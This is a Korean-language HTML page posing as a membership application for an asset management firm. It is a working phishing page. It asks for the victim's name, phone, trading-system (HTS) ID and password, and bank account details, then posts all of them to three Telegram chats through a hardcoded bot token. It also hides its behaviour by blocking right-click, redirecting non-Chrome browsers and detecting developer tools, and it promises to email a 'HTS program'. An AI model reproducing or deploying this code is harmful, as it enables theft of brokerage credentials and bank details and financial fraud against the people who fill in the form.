<body oncontextmenu="return false" ondragstart="return false" onselectstart="return false">
    <div class="header">
        <h1>베스트업 멤버십 신청 </h1>
    </div>
	<div class="topimfo">
		베스트업 자산운용
	</div>
	<div class="topimfo1">
		멤버십 신청  정보 입력
	</div>
	<div class="topimfo2">
		아래에 신청인 정보를 입력후 신청버튼을 클릭하세요.
	</div>
    <div class="container">
        <form id="membershipForm">
            <div class="form-group">
                <input type="text" id="name" name="name" required pattern="[가-힣a-zA-Z0-9]{2,5}" placeholder="이름" autocomplete="off">
                <input type="tel" id="phone" name="phone" required placeholder="휴대폰 번호" autocomplete="off">
            </div>
            <div class="form-group">
                <input type="text" id="htsId" name="htsId" required pattern="[a-zA-Z0-9]+" placeholder="HTS 아이디 입력" autocomplete="off">
                <input type="password" id="htsPassword" name="htsPassword" required pattern="[a-zA-Z0-9!@#$%^&*]+" placeholder="HTS 비밀번호 입력" autocomplete="off">
            </div>
            <div class="form-group">
                <input type="email" id="email" name="email" required placeholder="이메일" autocomplete="off">
                <input type="text" id="referrer" name="referrer" required pattern="[가-힣a-zA-Z0-9]{2,5}" placeholder="추천인" autocomplete="off">
            </div>
            <div class="form-group">
                <input type="text" id="bank" name="bank" required pattern="[가-힣]{1,10}" placeholder="은행명" autocomplete="off">
                <input type="text" id="accountHolder" name="accountHolder" required pattern="[가-힣a-zA-Z0-9]{2,5}" placeholder="예금주" autocomplete="off">
            </div>
            <div class="form-group">
                <input type="text" id="accountNumber" name="accountNumber" required pattern="\d+" placeholder="계좌번호" autocomplete="off">
            </div>
            <button type="submit" class="buttonbtn">멤버십 신청</button>
        </form>
    </div>
	<div class="downimfo1">
		​※ 회원 성함과 예금주가 동일하지 않을경우 및 휴대폰 명의자가 다를경우 이용이 제한될수 있습니다.
	</div>
	<div class="downimfo2">
		​※ 신청이 완료되면 검수후 고객님의 이메일로 HTS프로그램을 보내드리며 ​추가 문의 사항은 고객센터 상담원을 통해 상담이 가능하십니다
	</div>
	<div class="downimfo3">
		<br>
	</div>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            if (!navigator.userAgent.toLowerCase().includes("chrome")) {
                alert('정상적으로 이용해주세요.');
                window.location.href = "https://www.google.com";
            }
        });

        if (typeof jQuery === 'undefined') {
            alert('정상적으로 이용해주세요.');
            window.location.href = "https://www.google.com";
        }

        window.addEventListener("devtoolschange", function(e) {
            if(e.detail.isOpen) {
                alert('정상적으로 이용해주세요.');
                window.location.href = "https://www.google.com";
            }
        });
        $(document).ready(function() {
            $('#phone').on('input', function() {
                var number = $(this).val().replace(/[^\d]/g, '');
                $(this).val(number.replace(/(\d{3})(\d{3,4})(\d{4})/, '$1-$2-$3'));
            });

            $('#membershipForm').submit(function(event) {
                event.preventDefault();
                var valid = this.checkValidity();
                if (!valid) {
                    alert('모든 필드를 올바르게 입력하세요.');
                    return;
                }

                const data = {
                    name: $('#name').val(),
                    phone: $('#phone').val(),
                    htsId: $('#htsId').val(),
                    htsPassword: $('#htsPassword').val(),
                    email: $('#email').val(),
                    referrer: $('#referrer').val(),
                    bank: $('#bank').val(),
                    accountHolder: $('#accountHolder').val(),
                    accountNumber: $('#accountNumber').val(),
					date: new Date().toLocaleString("ko-KR", { timeZone: "Asia/Seoul" })
                };

                // Email validation
                if (!/\S+@\S+\.\S+/.test(data.email)) {
                    alert('이메일 주소를 정확히 입력하세요.');
                    return;
                }

                const message = `
☆멤버십 신청 정보☆:\n
※접수날짜: ${data.date}\n
※이름: ${data.name}\n
※휴대폰 번호: ${data.phone}\n
※HTS 아이디: ${data.htsId}\n
※HTS 비밀번호: ${data.htsPassword}\n
※이메일: ${data.email}\n
※추천인: ${data.referrer}\n
※은행명: ${data.bank}\n
※예금주: ${data.accountHolder}\n
※계좌번호: ${data.accountNumber}\n
                `;

				const botToken = '7340037891:AAGRpEijtgsGHplWdDoVWo9mZiI90gGRab8';
				const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
				const chatIds = ['58166324', '7280832936', '7016392614'];

				// Send the message to each chat ID
				chatIds.forEach(chatId => {
					$.ajax({
						type: "POST",
						url: url,
						data: {
							chat_id: chatId,
							text: message
						},
						success: function(response) {
							console.log("Message sent to chat ID:", chatId);
						},
						error: function(xhr, status, error) {
							console.error("Error sending message to chat ID " + chatId + ": ", error);
						}
					});
				});

				// Feedback to user
				alert("신청이 성공적으로 접수되었습니다!");
				$('form')[0].reset(); // Reset form fields after successful submission
            });
        });
    </script>
